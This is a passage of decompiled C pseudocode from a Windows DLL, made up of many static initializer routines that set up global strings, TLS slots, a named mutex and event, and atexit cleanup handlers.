  sub_1000D17D(dword_101866C4, v0);
  return atexit(sub_100F3186);
}
// 101866C4: using guessed type _DWORD dword_101866C4[2];

//----- (100C5920) --------------------------------------------------------
int sub_100C5920()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B734);
  sub_1000D17D(dword_10186704, v0);
  return atexit(sub_100F3190);
}
// 10186704: using guessed type _DWORD dword_10186704[2];

//----- (100C5942) --------------------------------------------------------
int sub_100C5942()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B76C);
  sub_1000D17D(dword_1018672C, v0);
  return atexit(sub_100F319A);
}
// 1018672C: using guessed type _DWORD dword_1018672C[2];

//----- (100C5964) --------------------------------------------------------
int sub_100C5964()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B7A4);
  sub_1000D17D(dword_10186594, v0);
  return atexit(sub_100F31A4);
}
// 10186594: using guessed type _DWORD dword_10186594[2];

//----- (100C5986) --------------------------------------------------------
int sub_100C5986()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B7E8);
  sub_1000D17D(dword_101867CC, v0);
  return atexit(sub_100F31AE);
}
// 101867CC: using guessed type _DWORD dword_101867CC[2];

//----- (100C59A8) --------------------------------------------------------
int sub_100C59A8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B82C);
  sub_1000D17D(dword_10186564, v0);
  return atexit(sub_100F31B8);
}
// 10186564: using guessed type _DWORD dword_10186564[2];

//----- (100C59CA) --------------------------------------------------------
int sub_100C59CA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B864);
  sub_1000D17D(dword_1018665C, v0);
  return atexit(sub_100F31C2);
}
// 1018665C: using guessed type _DWORD dword_1018665C[2];

//----- (100C59EC) --------------------------------------------------------
int sub_100C59EC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B8A0);
  sub_1000D17D(dword_10186514, v0);
  return atexit(sub_100F31CC);
}
// 10186514: using guessed type _DWORD dword_10186514[2];

//----- (100C5A0E) --------------------------------------------------------
int sub_100C5A0E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B8D0);
  sub_1000D17D(dword_101865A4, v0);
  return atexit(sub_100F31D6);
}
// 101865A4: using guessed type _DWORD dword_101865A4[2];

//----- (100C5A30) --------------------------------------------------------
int sub_100C5A30()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B920);
  sub_1000D17D(dword_101864FC, v0);
  return atexit(sub_100F31E0);
}
// 101864FC: using guessed type _DWORD dword_101864FC[2];

//----- (100C5A52) --------------------------------------------------------
int sub_100C5A52()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B970);
  sub_1000D17D(dword_101866A4, v0);
  return atexit(sub_100F31EA);
}
// 101866A4: using guessed type _DWORD dword_101866A4[2];

//----- (100C5A74) --------------------------------------------------------
int sub_100C5A74()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B9B8);
  sub_1000D17D(dword_101866F4, v0);
  return atexit(sub_100F31F4);
}
// 101866F4: using guessed type _DWORD dword_101866F4[2];

//----- (100C5A96) --------------------------------------------------------
int sub_100C5A96()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B9F0);
  sub_1000D17D(dword_101867E4, v0);
  return atexit(sub_100F31FE);
}
// 101867E4: using guessed type _DWORD dword_101867E4[2];

//----- (100C5AB8) --------------------------------------------------------
int sub_100C5AB8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BA2C);
  sub_1000D17D(dword_10186644, v0);
  return atexit(sub_100F3208);
}
// 10186644: using guessed type _DWORD dword_10186644[2];

//----- (100C5ADA) --------------------------------------------------------
int sub_100C5ADA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BA5C);
  sub_1000D17D(dword_10186754, v0);
  return atexit(sub_100F3212);
}
// 10186754: using guessed type _DWORD dword_10186754[2];

//----- (100C5AFC) --------------------------------------------------------
int sub_100C5AFC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BAC8);
  sub_1000D17D(dword_10186764, v0);
  return atexit(sub_100F321C);
}
// 10186764: using guessed type _DWORD dword_10186764[2];

//----- (100C5B1E) --------------------------------------------------------
int sub_100C5B1E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BB10);
  sub_1000D17D(dword_101867D4, v0);
  return atexit(sub_100F3226);
}
// 101867D4: using guessed type _DWORD dword_101867D4[2];

//----- (100C5B40) --------------------------------------------------------
int sub_100C5B40()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BB5C);
  sub_1000D17D(dword_101865D4, v0);
  return atexit(sub_100F3230);
}
// 101865D4: using guessed type _DWORD dword_101865D4[2];

//----- (100C5B62) --------------------------------------------------------
int sub_100C5B62()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BA8C);
  sub_1000D17D(dword_10186664, v0);
  return atexit(sub_100F323A);
}
// 10186664: using guessed type _DWORD dword_10186664[2];

//----- (100C5B84) --------------------------------------------------------
int sub_100C5B84()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BB9C);
  sub_1000D17D(dword_10186684, v0);
  return atexit(sub_100F3244);
}
// 10186684: using guessed type _DWORD dword_10186684[2];

//----- (100C5BA6) --------------------------------------------------------
int sub_100C5BA6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BBD8);
  sub_1000D17D(dword_101866CC, v0);
  return atexit(sub_100F324E);
}
// 101866CC: using guessed type _DWORD dword_101866CC[2];

//----- (100C5BC8) --------------------------------------------------------
int sub_100C5BC8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BC08);
  sub_1000D17D(dword_10186604, v0);
  return atexit(sub_100F3258);
}
// 10186604: using guessed type _DWORD dword_10186604[2];

//----- (100C5BEA) --------------------------------------------------------
int sub_100C5BEA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BC48);
  sub_1000D17D(dword_1018673C, v0);
  return atexit(sub_100F3262);
}
// 1018673C: using guessed type _DWORD dword_1018673C[2];

//----- (100C5C0C) --------------------------------------------------------
int sub_100C5C0C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BC84);
  sub_1000D17D(dword_101865AC, v0);
  return atexit(sub_100F326C);
}
// 101865AC: using guessed type _DWORD dword_101865AC[2];

//----- (100C5C2E) --------------------------------------------------------
int sub_100C5C2E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BCB8);
  sub_1000D17D(dword_101867EC, v0);
  return atexit(sub_100F3276);
}
// 101867EC: using guessed type _DWORD dword_101867EC[2];

//----- (100C5C50) --------------------------------------------------------
int sub_100C5C50()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BD28);
  sub_1000D17D(dword_1018668C, v0);
  return atexit(sub_100F3280);
}
// 1018668C: using guessed type _DWORD dword_1018668C[2];

//----- (100C5C72) --------------------------------------------------------
int sub_100C5C72()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BD70);
  sub_1000D17D(dword_101865B4, v0);
  return atexit(sub_100F328A);
}
// 101865B4: using guessed type _DWORD dword_101865B4[2];

//----- (100C5C94) --------------------------------------------------------
int sub_100C5C94()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BDB8);
  sub_1000D17D(dword_1018655C, v0);
  return atexit(sub_100F3294);
}
// 1018655C: using guessed type _DWORD dword_1018655C[2];

//----- (100C5CB6) --------------------------------------------------------
int sub_100C5CB6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BCEC);
  sub_1000D17D(dword_1018676C, v0);
  return atexit(sub_100F329E);
}
// 1018676C: using guessed type _DWORD dword_1018676C[2];

//----- (100C5CD8) --------------------------------------------------------
int sub_100C5CD8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BE18);
  sub_1000D17D(dword_101865CC, v0);
  return atexit(sub_100F32A8);
}
// 101865CC: using guessed type _DWORD dword_101865CC[2];

//----- (100C5CFA) --------------------------------------------------------
int sub_100C5CFA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BE68);
  sub_1000D17D(dword_1018675C, v0);
  return atexit(sub_100F32B2);
}
// 1018675C: using guessed type _DWORD dword_1018675C[2];

//----- (100C5D1C) --------------------------------------------------------
int sub_100C5D1C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BE98);
  sub_1000D17D(dword_10186744, v0);
  return atexit(sub_100F32BC);
}
// 10186744: using guessed type _DWORD dword_10186744[2];

//----- (100C5D3E) --------------------------------------------------------
int sub_100C5D3E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BECC);
  sub_1000D17D(dword_1018674C, v0);
  return atexit(sub_100F32C6);
}
// 1018674C: using guessed type _DWORD dword_1018674C[2];

//----- (100C5D60) --------------------------------------------------------
int sub_100C5D60()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BF00);
  sub_1000D17D(dword_10186534, v0);
  return atexit(sub_100F32D0);
}
// 10186534: using guessed type _DWORD dword_10186534[2];

//----- (100C5D82) --------------------------------------------------------
int sub_100C5D82()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BF30);
  sub_1000D17D(dword_101865EC, v0);
  return atexit(sub_100F32DA);
}
// 101865EC: using guessed type _DWORD dword_101865EC[2];

//----- (100C5DA4) --------------------------------------------------------
int sub_100C5DA4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BF70);
  sub_1000D17D(dword_1018661C, v0);
  return atexit(sub_100F32E4);
}
// 1018661C: using guessed type _DWORD dword_1018661C[2];

//----- (100C5DC6) --------------------------------------------------------
int sub_100C5DC6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017BFB8);
  sub_1000D17D(dword_10186674, v0);
  return atexit(sub_100F32EE);
}
// 10186674: using guessed type _DWORD dword_10186674[2];

//----- (100C5DE8) --------------------------------------------------------
int sub_100C5DE8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C000);
  sub_1000D17D(dword_1018657C, v0);
  return atexit(sub_100F32F8);
}
// 1018657C: using guessed type _DWORD dword_1018657C[2];

//----- (100C5E0A) --------------------------------------------------------
int sub_100C5E0A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C040);
  sub_1000D17D(dword_101864DC, v0);
  return atexit(sub_100F3302);
}
// 101864DC: using guessed type _DWORD dword_101864DC[2];

//----- (100C5E2C) --------------------------------------------------------
int sub_100C5E2C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C090);
  sub_1000D17D(dword_101867DC, v0);
  return atexit(sub_100F330C);
}
// 101867DC: using guessed type _DWORD dword_101867DC[2];

//----- (100C5E4E) --------------------------------------------------------
int sub_100C5E4E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C0D8);
  sub_1000D17D(dword_10186714, v0);
  return atexit(sub_100F3316);
}
// 10186714: using guessed type _DWORD dword_10186714[2];

//----- (100C5E70) --------------------------------------------------------
int sub_100C5E70()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C120);
  sub_1000D17D(dword_10186504, v0);
  return atexit(sub_100F3320);
}
// 10186504: using guessed type _DWORD dword_10186504[2];

//----- (100C5E92) --------------------------------------------------------
int sub_100C5E92()
{
  sub_100030C4(dword_10193B54);
  return atexit(sub_100F3372);
}
// 10193B54: using guessed type int dword_10193B54[8];

//----- (100C5EA8) --------------------------------------------------------
int sub_100C5EA8()
{
  sub_1000728E(dword_10193B8C, 0);
  return atexit(sub_100F3368);
}
// 10193B8C: using guessed type _DWORD dword_10193B8C[3];

//----- (100C5EC2) --------------------------------------------------------
int sub_100C5EC2()
{
  sub_10008066(dword_10193B74);
  return atexit(sub_100F335E);
}
// 10193B74: using guessed type _DWORD dword_10193B74[2];

//----- (100C5ED8) --------------------------------------------------------
int sub_100C5ED8()
{
  sub_100067D5(dword_10193B98);
  return atexit(sub_100F3354);
}
// 10193B98: using guessed type LONG dword_10193B98[8];

//----- (100C5EEE) --------------------------------------------------------
int sub_100C5EEE()
{
  sub_100066C2(dword_10193B44);
  return atexit(sub_100F334A);
}
// 10193B44: using guessed type _DWORD dword_10193B44[4];

//----- (100C5F04) --------------------------------------------------------
int sub_100C5F04()
{
  sub_100077CD(dword_10193B84);
  return atexit(sub_100F3340);
}
// 10193B84: using guessed type _DWORD dword_10193B84[2];

//----- (100C5F1C) --------------------------------------------------------
int sub_100C5F1C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A5A0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_1018687C, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F337C);
}
// 1018687C: using guessed type _DWORD dword_1018687C[2];

//----- (100C5F78) --------------------------------------------------------
int sub_100C5F78()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A6C4);
  sub_1000D17D(dword_10186834, v0);
  return atexit(sub_100F3386);
}
// 10186834: using guessed type _DWORD dword_10186834[2];

//----- (100C5F9A) --------------------------------------------------------
int sub_100C5F9A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A6FC);
  sub_1000D17D(dword_10186874, v0);
  return atexit(sub_100F3390);
}
// 10186874: using guessed type _DWORD dword_10186874[2];

//----- (100C5FBC) --------------------------------------------------------
int sub_100C5FBC()
{
  DWORD CurrentProcessId; // edi
  DWORD v1; // eax

  CurrentProcessId = GetCurrentProcessId();
  v1 = GetCurrentProcessId();
  dword_10186888 = 0;
  dword_10186884 = (int)off_100FC204;
  sub_1000A198((HANDLE *)&dword_10186884, (HANDLE)0xFFFFFFFF, 0, 0, v1, CurrentProcessId);
  return atexit(sub_100F339A);
}
// 100FC204: using guessed type int (__thiscall *off_100FC204[2])(void *Block, char);
// 10186884: using guessed type int dword_10186884;

//----- (100C5FFA) --------------------------------------------------------
int sub_100C5FFA()
{
  sub_1000728E(&dword_10186824, 0);
  return atexit(sub_100F33A4);
}
// 10186824: using guessed type int dword_10186824;

//----- (100C6014) --------------------------------------------------------
int sub_100C6014()
{
  sub_1000728E(dword_10186854, 0);
  return atexit(sub_100F33CC);
}
// 10186854: using guessed type _DWORD dword_10186854[2];

//----- (100C602E) --------------------------------------------------------
int sub_100C602E()
{
  sub_1000728E(dword_1018683C, 0);
  return atexit(sub_100F33C2);
}
// 1018683C: using guessed type _DWORD dword_1018683C[2];

//----- (100C6048) --------------------------------------------------------
int sub_100C6048()
{
  sub_1000728E(dword_1018681C, 0);
  return atexit(sub_100F33B8);
}
// 1018681C: using guessed type _DWORD dword_1018681C[2];

//----- (100C6062) --------------------------------------------------------
int sub_100C6062()
{
  sub_1000728E(dword_1018682C, 0);
  return atexit(sub_100F33AE);
}
// 1018682C: using guessed type _DWORD dword_1018682C[2];

//----- (100C607C) --------------------------------------------------------
int sub_100C607C()
{
  sub_1000A292(dword_1018685C);
  return atexit(sub_100F33D6);
}
// 1018685C: using guessed type _DWORD dword_1018685C[4];

//----- (100C6092) --------------------------------------------------------
int sub_100C6092()
{
  sub_1000A292(dword_10186844);
  return atexit(sub_100F33E0);
}
// 10186844: using guessed type _DWORD dword_10186844[4];

//----- (100C60A8) --------------------------------------------------------
int sub_100C60A8()
{
  volatile LONG *v0; // eax

  v0 = (volatile LONG *)operator new(4u);
  if ( v0 )
    *v0 = 1;
  else
    v0 = 0;
  dword_1018686C = 0;
  Block = v0;
  return atexit(sub_100F33EA);
}
// 1018686C: using guessed type int dword_1018686C;

//----- (100C60F7) --------------------------------------------------------
int sub_100C60F7()
{
  sub_10006814(dword_1018688C);
  return atexit(sub_100F33EF);
}
// 1018688C: using guessed type int dword_1018688C[4];

//----- (100C610D) --------------------------------------------------------
int sub_100C610D()
{
  sub_1000D17D(&dword_1018689C, &word_1017A734);
  return atexit(sub_100F33F9);
}
// 1018689C: using guessed type int dword_1018689C;

//----- (100C6128) --------------------------------------------------------
int sub_100C6128()
{
  sub_1000A11B(dword_10193BB8);
  return atexit(sub_100F3417);
}
// 10193BB8: using guessed type _DWORD dword_10193BB8[4];

//----- (100C613E) --------------------------------------------------------
int sub_100C613E()
{
  sub_1000728E(dword_10193BD8, 0);
  return atexit(sub_100F340D);
}
// 10193BD8: using guessed type _DWORD dword_10193BD8[2];

//----- (100C6158) --------------------------------------------------------
int sub_100C6158()
{
  sub_1000B1F3(0, (int)dword_10193BE0, 0);
  return atexit(sub_100F3403);
}
// 10193BE0: using guessed type LONG dword_10193BE0[6];

//----- (100C6174) --------------------------------------------------------
int sub_100C6174()
{
  int result; // eax

  result = 0;
  dword_10193BC8[0] = 0;
  dword_10193BC8[1] = 0;
  dword_10193BC8[2] = 0;
  dword_10193BC8[3] = 0;
  return result;
}
// 10193BC8: using guessed type _DWORD dword_10193BC8[4];

//----- (100C6195) --------------------------------------------------------
int sub_100C6195()
{
  const CHAR *v0; // eax
  HANDLE EventA; // eax
  DWORD v3; // [esp-8h] [ebp-Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-8h]

  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  v0 = (const CHAR *)sub_1000CBFA((int)&unk_1017A574);
  EventA = CreateEventA(0, 1, 0, v0);
  sub_10011AF4((int)&dword_1017DB0C, EventA, 0, 0, v3, CurrentProcessId);
  return atexit(sub_100F3421);
}
// 1017DB0C: using guessed type _DWORD dword_1017DB0C;

//----- (100C61D4) --------------------------------------------------------
int sub_100C61D4()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A4E0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_101868A4, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F342B);
}
// 101868A4: using guessed type _DWORD dword_101868A4[2];

//----- (100C6230) --------------------------------------------------------
int sub_100C6230()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A528);
  sub_1000D17D(dword_101868AC, v0);
  return atexit(sub_100F3435);
}
// 101868AC: using guessed type _DWORD dword_101868AC[2];

//----- (100C6252) --------------------------------------------------------
int sub_100C6252()
{
  HANDLE MutexA; // eax
  DWORD v2; // [esp-8h] [ebp-Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-8h]

  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  MutexA = CreateMutexA(0, 0, Name);
  sub_10011AF4((int)&dword_1017DB14, MutexA, 0, 0, v2, CurrentProcessId);
  return atexit(sub_100F343F);
}
// 1017DB14: using guessed type _DWORD dword_1017DB14;

//----- (100C6288) --------------------------------------------------------
int sub_100C6288()
{
  dwTlsIndex = TlsAlloc();
  if ( dwTlsIndex == -1 )
    sub_10015BF6();
  return atexit(sub_100F3449);
}
// 10015BF6: using guessed type void __noreturn sub_10015BF6(void);

//----- (100C62A9) --------------------------------------------------------
int sub_100C62A9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A340);
  sub_1000D17D(dword_101868B4, v0);
  return atexit(sub_100F3453);
}
// 101868B4: using guessed type _DWORD dword_101868B4[2];

//----- (100C62CB) --------------------------------------------------------
int sub_100C62CB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A1D8);
  sub_1000D17D(dword_101868C4, v0);
  return atexit(sub_100F345D);
}
// 101868C4: using guessed type _DWORD dword_101868C4[2];

//----- (100C62ED) --------------------------------------------------------
int sub_100C62ED()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A208);
  sub_1000D17D(dword_101868CC, v0);
  return atexit(sub_100F3467);
}
// 101868CC: using guessed type _DWORD dword_101868CC[2];

//----- (100C630F) --------------------------------------------------------
int sub_100C630F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A23C);
  sub_1000D17D(dword_101868D4, v0);
  return atexit(sub_100F3471);
}
// 101868D4: using guessed type _DWORD dword_101868D4[2];

//----- (100C6331) --------------------------------------------------------
int sub_100C6331()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A26C);
  sub_1000D17D(dword_101868EC, v0);
  return atexit(sub_100F347B);
}
// 101868EC: using guessed type _DWORD dword_101868EC[2];

//----- (100C6353) --------------------------------------------------------
int sub_100C6353()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A29C);
  sub_1000D17D(dword_101868DC, v0);
  return atexit(sub_100F3485);
}
// 101868DC: using guessed type _DWORD dword_101868DC[2];

//----- (100C6375) --------------------------------------------------------
int sub_100C6375()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A2CC);
  sub_1000D17D(dword_101868BC, v0);
  return atexit(sub_100F348F);
}
// 101868BC: using guessed type _DWORD dword_101868BC[2];

//----- (100C6397) --------------------------------------------------------
int sub_100C6397()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A2FC);
  sub_1000D17D(dword_101868E4, v0);
  return atexit(sub_100F3499);
}
// 101868E4: using guessed type _DWORD dword_101868E4[2];

//----- (100C63B9) --------------------------------------------------------
int sub_100C63B9()
{
  sub_10012103(byte_10193BF8);
  return atexit(sub_100F34A3);
}

//----- (100C63CF) --------------------------------------------------------
int sub_100C63CF()
{
  dword_10182DE0 = TlsAlloc();
  if ( dword_10182DE0 == -1 )
    sub_10015BF6();
  return atexit(sub_100F34AD);
}
// 10015BF6: using guessed type void __noreturn sub_10015BF6(void);

//----- (100C63F0) --------------------------------------------------------
int sub_100C63F0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179E9C);
  sub_1000D17D(dword_101868F4, v0);
  return atexit(sub_100F34B7);
}
// 101868F4: using guessed type _DWORD dword_101868F4[2];

//----- (100C6412) --------------------------------------------------------
int sub_100C6412()
{
  int v1[7]; // [esp-Ch] [ebp-1Ch] BYREF

  v1[3] = (int)v1;
  sub_1001B526(v1, 0);
  v1[6] = -1;
  sub_10015117(v1[0], v1[1], (HANDLE)v1[2]);
  return atexit(sub_100F34C1);
}

//----- (100C6451) --------------------------------------------------------
int sub_100C6451()
{
  dword_1017DB08 = TlsAlloc();
  if ( dword_1017DB08 == -1 )
    sub_10015BF6();
  if ( !TlsSetValue(dword_1017DB08, 0) )
    sub_10015C59();
  return atexit(sub_100F34CB);
}
// 10015BF6: using guessed type void __noreturn sub_10015BF6(void);
// 10015C59: using guessed type void __noreturn sub_10015C59(void);

//----- (100C6489) --------------------------------------------------------
int sub_100C6489()
{
  sub_10015734();
  return atexit(sub_100F34D5);
}

//----- (100C649A) --------------------------------------------------------
int sub_100C649A()
{
  sub_1000B1F3((void *)0x100, (int)dword_10186904, &unk_10179CE8);
  return atexit(sub_100F34DF);
}
// 10186904: using guessed type _DWORD dword_10186904[5];

//----- (100C64BC) --------------------------------------------------------
int sub_100C64BC()
{
  sub_1000D17D(dword_10186918, asc_10179CD4);
  return atexit(sub_100F34E9);
}
// 10186918: using guessed type _DWORD dword_10186918[2];

//----- (100C64D7) --------------------------------------------------------
int sub_100C64D7()
{
  sub_1000D17D(dword_10186920, &word_10179CD8);
  return atexit(sub_100F34F3);
}
// 10186920: using guessed type _DWORD dword_10186920[2];

//----- (100C64F2) --------------------------------------------------------
int sub_100C64F2()
{
  sub_1001EC12((int)dword_10193C18);
  return atexit(sub_100F3507);
}
// 10193C18: using guessed type int dword_10193C18[9];

//----- (100C6508) --------------------------------------------------------
int sub_100C6508()
{
  return atexit(sub_100F34FD);
}

//----- (100C6514) --------------------------------------------------------
int sub_100C6514()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179B90);
  sub_1000D17D(dword_10186950, v0);
  return atexit(sub_100F3511);
}
// 10186950: using guessed type _DWORD dword_10186950[2];

//----- (100C6536) --------------------------------------------------------
int sub_100C6536()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179BC0);
  sub_1000D17D(dword_10186940, v0);
  return atexit(sub_100F351B);
}
// 10186940: using guessed type _DWORD dword_10186940[2];

//----- (100C6558) --------------------------------------------------------
int sub_100C6558()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179BF0);
  sub_1000D17D(dword_10186948, v0);
  return atexit(sub_100F3525);
}
// 10186948: using guessed type _DWORD dword_10186948[2];

//----- (100C657A) --------------------------------------------------------
int sub_100C657A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179C20);
  sub_1000D17D(dword_10186928, v0);
  return atexit(sub_100F352F);
}
// 10186928: using guessed type _DWORD dword_10186928[2];

//----- (100C659C) --------------------------------------------------------
int sub_100C659C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179C50);
  sub_1000D17D(dword_10186938, v0);
  return atexit(sub_100F3539);
}
// 10186938: using guessed type _DWORD dword_10186938[2];

//----- (100C65BE) --------------------------------------------------------
int sub_100C65BE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179C80);
  sub_1000D17D(dword_10186930, v0);
  return atexit(sub_100F3543);
}
// 10186930: using guessed type _DWORD dword_10186930[2];

//----- (100C65E0) --------------------------------------------------------
int sub_100C65E0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179A30);
  sub_1000D17D(dword_10186968, v0);
  return atexit(sub_100F354D);
}
// 10186968: using guessed type _DWORD dword_10186968[2];

//----- (100C6602) --------------------------------------------------------
int sub_100C6602()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179A70);
  sub_1000D17D(dword_10186958, v0);
  return atexit(sub_100F3557);
}
// 10186958: using guessed type _DWORD dword_10186958[2];

//----- (100C6624) --------------------------------------------------------
int sub_100C6624()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179AA8);
  sub_1000D17D(dword_10186960, v0);
  return atexit(sub_100F3561);
}
// 10186960: using guessed type _DWORD dword_10186960[2];

//----- (100C6646) --------------------------------------------------------
int sub_100C6646()
{
  sub_1001B4E0(dword_10193C3C);
  return atexit(sub_100F356B);
}
// 10193C3C: using guessed type _DWORD dword_10193C3C[3];

//----- (100C665C) --------------------------------------------------------
int sub_100C665C()
{
  sub_1001EC12((int)dword_10193C48);
  return atexit(sub_100F357F);
}
// 10193C48: using guessed type int dword_10193C48[9];

//----- (100C6672) --------------------------------------------------------
int sub_100C6672()
{
  return atexit(sub_100F3575);
}

//----- (100C667E) --------------------------------------------------------
int sub_100C667E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179704);
  sub_1000D17D(dword_10186970, v0);
  return atexit(sub_100F3589);
}
// 10186970: using guessed type _DWORD dword_10186970[2];

//----- (100C66A0) --------------------------------------------------------
char *sub_100C66A0()
{
  char *result; // eax

  result = (char *)sub_1000CBFA((int)&unk_10179740);
  dword_1017DB28 = result;
  return result;
}

//----- (100C66B1) --------------------------------------------------------
char *sub_100C66B1()
{
  char *result; // eax

  result = (char *)sub_1000CBFA((int)&unk_10179760);
  dword_1017DB24 = result;
  return result;
}

//----- (100C66C2) --------------------------------------------------------
int sub_100C66C2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017961C);
  sub_1000D17D(dword_1017DB2C, v0);
  return atexit(sub_100F3593);
}
// 1017DB2C: using guessed type _DWORD dword_1017DB2C[2];

//----- (100C66E4) --------------------------------------------------------
int sub_100C66E4()
{
  sub_1000D17D(dword_10186978, aLnk);
  return atexit(sub_100F359D);
}
// 10186978: using guessed type _DWORD dword_10186978[2];

//----- (100C66FF) --------------------------------------------------------
int sub_100C66FF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101793FC);
  sub_1000D17D(dword_10186980, v0);
  return atexit(sub_100F35A7);
